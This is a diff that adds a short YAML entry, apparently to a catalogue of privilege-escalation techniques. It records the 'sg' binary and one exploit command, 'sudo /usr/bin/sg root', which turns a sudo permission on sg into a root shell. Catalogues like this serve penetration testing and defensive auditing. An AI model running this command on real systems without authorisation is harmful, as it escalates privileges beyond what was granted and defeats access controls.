@@ -1,0 +1,4 @@
+name: sg
+binary_path: /usr/bin/sg
+exploit_cmds:
+- sudo /usr/bin/sg root
